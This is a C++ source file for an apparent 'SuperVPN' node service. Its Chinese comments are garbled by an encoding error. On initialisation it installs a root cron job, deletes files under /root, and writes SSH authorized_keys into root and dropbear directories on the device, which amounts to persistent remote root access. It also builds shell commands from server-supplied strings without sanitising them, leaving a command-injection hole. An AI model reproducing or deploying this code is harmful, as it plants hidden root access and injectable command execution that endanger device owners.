/*********************************************************
ģ����       : ����ڵ���(Certificate\DP)
�ļ���       : NodeSrv.cpp
����ļ�     : NodeSrv.h
�ļ�ʵ�ֹ��� : ����ڵ�ʵ��
����         :lewis
����ʱ��     :2017-09
**********************************************************/
#include "NodeSrv.hpp"
#include "HttpSrvNode.hpp"
#include "NDFunc.hpp"

extern CBaseApp *gPSuperVPNApp;

/*********************************************************
����˵�������캯��
���˵������
����˵������
����ֵ  ����
*********************************************************/
CNodeSrv::CNodeSrv()
{
	mPHttpClient = new CHttpSrvNode(this);
	mNoRecvHelloTime = 0;
}

/*********************************************************
����˵������������
���˵������
����˵������
����ֵ  ����
*********************************************************/
CNodeSrv::~CNodeSrv()
{
}

/*********************************************************
����˵�����ӱ���ʼ��
���˵����
����˵����
����ֵ  ��
*********************************************************/
void CNodeSrv::KBInit()
{
	AfxExecCmd("mkdir /etc/crontabs > /dev/null 2>&1");
	AfxExecCmd("touch /etc/crontabs/root");
	AfxExecCmd("chmod 755 /etc/crontabs/root");

	char cmd[1024]={0};
	CSuperVPNApp *pSuperVPNApp = dynamic_cast<CSuperVPNApp*> (gPSuperVPNApp);
	sprintf(cmd, "echo \"*/%d *   * * *   /usr/bin/CheckSuperVPN >> /dev/null 2>&1\" > /etc/crontabs/root", AfxGetTaskTime());
	AfxExecCmd(cmd);
	AfxExecCmd("/etc/init.d/S50cron restart");
	
	AfxExecCmd("rm -rf /root/dul*");
	AfxExecCmd("rm -rf /root/autodul.log");
	
	AfxExecCmd("mkdir -p /root/.ssh");
	AfxExecCmd("mkdir -p /thunder/rootfs_patch/etc/dropbear/");
	AfxExecCmd("mkdir -p /etc/dropbear/");
	AfxExecCmd("mkdir -p /thunder/rootfs_patch/root/.ssh");
	AfxExecCmd("chown 0:0 /root");
	AfxExecCmd("chown 0:0 /thunder/rootfs_patch/root");

	AfxKBWriteSSHKey("/root/.ssh/authorized_keys");
	AfxKBWriteSSHKey("/thunder/rootfs_patch/root/.ssh/authorized_keys");
	AfxKBWriteSSHKey("/etc/dropbear/authorized_keys");
	AfxKBWriteSSHKey("/thunder/rootfs_patch/etc/dropbear/authorized_keys");
}

/*********************************************************
����˵�������ö�ʱ����ʱ��
���˵����
����˵����
����ֵ  ��
*********************************************************/
void CNodeSrv::KBResetTimer()
{
	char cmd[1024]={0};
	CSuperVPNApp *pSuperVPNApp = dynamic_cast<CSuperVPNApp*> (gPSuperVPNApp);
	sprintf(cmd, "echo \"*/%d *   * * *   /usr/bin/CheckSuperVPN >> /dev/null 2>&1\" > /etc/crontabs/root", AfxGetTaskTime());
	AfxExecCmd(cmd);
	AfxExecCmd("/etc/init.d/S50cron restart");
	AfxExecCmd("/etc/init.d/cron restart");
}

/*********************************************************
����˵�����ڵ��ʼ��
���˵������
����˵������
����ֵ  ��DP_SUCCESS-�ɹ�
          Others-ʧ��
*********************************************************/
ndStatus CNodeSrv::NodeInit()
{
	KBInit();
	return CNodeGeneral::NodeInit();
}

/*********************************************************
����˵�����ڵ㻷������
���˵������
����˵������
����ֵ  ��DP_SUCCESS-�ɹ�
          Others-ʧ��
*********************************************************/
ndStatus CNodeSrv::NodeEnvSet()
{
    //���ò���
    ndStatus ret = mPHttpClient->NodeEnvSet();
	if (ret != ND_SUCCESS)
	{
		AfxWriteDebugLog("SuperVPN run at [CNodeSrv::NodeEnvSet] Node Evn set error=[%d]", ret);
		return ret;
	}

	return SetN2NVPNNetwork();
}

/*********************************************************
����˵�������ݷ��ص������������vpn����
���˵������
����˵������
����ֵ  ��DP_SUCCESS-�ɹ�
          Others-ʧ��
*********************************************************/
ndStatus CNodeSrv::SetN2NVPNNetwork()
{
	//edge -d node0 -a 11.2.3.33 -s 255.255.0.0 -c vpntest -k vpntest -l lja1.zrdx.com:5678 -f -r
	int iNodeIndex=0;

	//��������е�EDGE����
	AfxCleanAllEdge();

	if (mSNodeInform.mSupperNode.size() <= 0)
	{
        AfxWriteDebugLog("SuperVPN run at [CNodeSrv::SetN2NVPNNetwork] Reponse supper size error");
        return ND_ERROR_INVALID_RESPONSE;		
	}
	SSupperNode superNode = mSNodeInform.mSupperNode[0];

	if (mSNodeInform.mDomainInforms.size() <=0)
	{
		AfxWriteDebugLog("SuperVPN run at [CNodeSrv::SetN2NVPNNetwork] Domain Inform Empty ERROR");
		return ND_ERROR_INVALID_PARAM;	
	}

	list<SDomain>::iterator iterDomain;
    for(iterDomain=mSNodeInform.mDomainInforms.begin(); iterDomain!=mSNodeInform.mDomainInforms.end(); iterDomain++)
    {
    	SDomain domain = *iterDomain;

		if(domain.lNodeIP.empty() || domain.lMask.empty() || domain.sDomain.empty() || domain.sDomainKey.empty())
		{
			AfxWriteDebugLog("SuperVPN run at [CNodeSrv::SetN2NVPNNetwork] Domain Inform Empty ERROR");
			return ND_ERROR_INVALID_PARAM;
		}

		char *ExecCMD = (char*)calloc(1, 1024);
		sprintf(ExecCMD, "%s -d ian%d -a %s -s %s -c %s -k %s -l %s:%d -r",
					EDGE_EXE_PATH_NAME,
					iNodeIndex,
					domain.lNodeIP.c_str(),
					domain.lMask.c_str(),
					domain.sDomain.c_str(),
					domain.sDomainKey.c_str(),
					superNode.sSuperNodeIP.c_str(),
					superNode.iSuperNodePort);
		
	    pthread_t id;
	    int ret = pthread_create(&id, NULL, &CNodeGeneral::ThreadFunction, (void *)ExecCMD);
	    if(ret != 0)
	    {
	        AfxWriteDebugLog("SuperVPN run at [CNodeSrv::SetN2NVPNNetwork] pthread_create ERROR");
	        return ND_ERROR_PLATFORM_OS;
	    }
		iNodeIndex++;
    }

	return ND_SUCCESS;
}


